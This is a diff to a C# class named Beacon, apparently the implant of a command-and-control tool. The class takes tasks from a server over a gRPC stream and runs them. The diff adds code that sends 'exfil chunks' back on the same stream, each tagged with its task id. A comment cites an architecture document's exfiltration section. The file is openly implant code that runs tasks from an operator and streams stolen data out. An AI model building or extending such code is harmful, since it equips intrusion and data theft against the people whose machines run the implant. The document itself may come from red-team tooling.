@@ -172,14 +172,31 @@ internal sealed class Beacon
         {
             var frame = call.ResponseStream.Current;
             var task = TaskRequest.Parser.ParseFrom(frame.Payload);
-            var (outcome, output) = _runner.Dispatch(task.Verb, task.Arguments);
+            var (outcome, output, chunks) = _runner.Dispatch(task.Verb, task.Arguments);
             var result = new TaskResult
             {
                 TaskId = task.TaskId,
                 Outcome = outcome,
                 Output = output,
             };
-            await call.RequestStream.WriteAsync(new Frame { Payload = ByteString.CopyFrom(result.ToByteArray()) });
+            await call.RequestStream.WriteAsync(new Frame
+            {
+                Payload = ByteString.CopyFrom(result.ToByteArray()),
+                Kind = FrameKind.TaskResult,
+            });
+
+            // Out-of-band exfil chunks follow the TaskResult on the same stream.
+            // Each carries the task id so the server reassembles and routes them
+            // to the artifact store (architecture.md Sec 10.1 exfil, Sec 11).
+            foreach (var chunk in chunks)
+            {
+                chunk.TaskId = task.TaskId;
+                await call.RequestStream.WriteAsync(new Frame
+                {
+                    Payload = ByteString.CopyFrom(chunk.ToByteArray()),
+                    Kind = FrameKind.ExfilChunk,
+                });
+            }
         }
     }
 
